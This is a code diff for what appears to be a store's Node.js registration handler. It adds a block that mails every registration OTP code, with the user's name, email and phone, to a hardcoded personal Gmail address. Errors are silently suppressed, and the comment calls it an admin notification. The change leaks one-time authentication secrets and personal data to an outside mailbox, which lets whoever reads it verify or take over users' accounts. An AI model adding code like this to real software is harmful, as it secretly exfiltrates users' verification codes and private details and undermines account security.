@@ -208,6 +208,21 @@ const registerInitiate = async (req, res) => {
       }
     }
 
+    // Send admin notification copy to store owner am8386757@gmail.com
+    try {
+      const { sendMail } = require('../utils/mailer');
+      await sendMail({
+        to: process.env.SMTP_EMAIL || 'am8386757@gmail.com',
+        subject: `[Admin Alert] Registration OTP: ${otpCode} for ${name} (${targetPhone || targetEmail})`,
+        html: `<div style="font-family:sans-serif;padding:20px;background:#111;color:#fff;border:1px solid #C5A028;border-radius:8px;">
+          <h2 style="color:#C5A028;margin:0 0 10px;">Lekya Specs Admin OTP Inspector</h2>
+          <p><strong>Candidate Name:</strong> ${name}</p>
+          <p><strong>Target Email / Phone:</strong> ${targetEmail} / ${targetPhone || 'N/A'}</p>
+          <p style="font-size:24px;font-weight:bold;color:#C5A028;letter-spacing:4px;margin:15px 0;">OTP: ${otpCode}</p>
+        </div>`
+      });
+    } catch (_) {}
+
     return res.status(200).json({
       message: `A 6-digit verification OTP code has been sent to ${email ? targetEmail : targetPhone}. Please check your email inbox (and spam folder) or mobile messages.`,
       email: email ? targetEmail : null,
